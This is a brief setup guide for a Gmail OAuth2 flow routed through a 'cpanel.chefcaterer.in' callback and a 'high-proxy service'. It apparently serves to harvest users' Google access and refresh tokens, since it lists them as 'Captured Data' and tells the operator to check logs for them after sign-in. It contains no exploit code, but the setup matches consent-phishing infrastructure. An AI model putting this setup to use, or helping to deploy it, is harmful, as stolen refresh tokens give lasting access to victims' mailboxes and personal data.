# Gmail OAuth2 Setup Guide

## Environment Variables Required

Add these to your `.env` file or environment:

```bash
# Google OAuth2 Credentials
GOOGLE_CLIENT_ID=your-google-client-id-here
GOOGLE_CLIENT_SECRET=your-google-client-secret-here

# OAuth2 Redirect URI (must match Google Console configuration)
REDIRECT_URI=https://cpanel.chefcaterer.in/oauth/callback
```

## Google Cloud Console Setup

1. Go to [Google Cloud Console](https://console.cloud.google.com/)
2. Create a new project or select existing one
3. Enable Gmail API and Google+ API
4. Go to "Credentials" → "Create Credentials" → "OAuth 2.0 Client IDs"
5. Set Application type to "Web application"
6. Add authorized redirect URIs:
   - `https://cpanel.chefcaterer.in/oauth/callback`
7. Copy the Client ID and Client Secret

## OAuth2 Flow

1. User visits: `https://cpanel.chefcaterer.in/oauth/authorize`
2. System redirects to Google OAuth2 consent screen
3. User authorizes the application
4. Google redirects back to: `https://cpanel.chefcaterer.in/oauth/callback`
5. System exchanges authorization code for access token
6. System retrieves user information
7. User is redirected to success page

## Captured Data

The OAuth2 implementation captures:
- User email address
- User name
- User ID
- Profile picture URL
- Access token
- Refresh token
- Token expiration

## Testing

1. Set your environment variables
2. Restart your high-proxy service
3. Visit: `https://cpanel.chefcaterer.in/oauth/authorize`
4. Complete the OAuth2 flow
5. Check logs for captured data
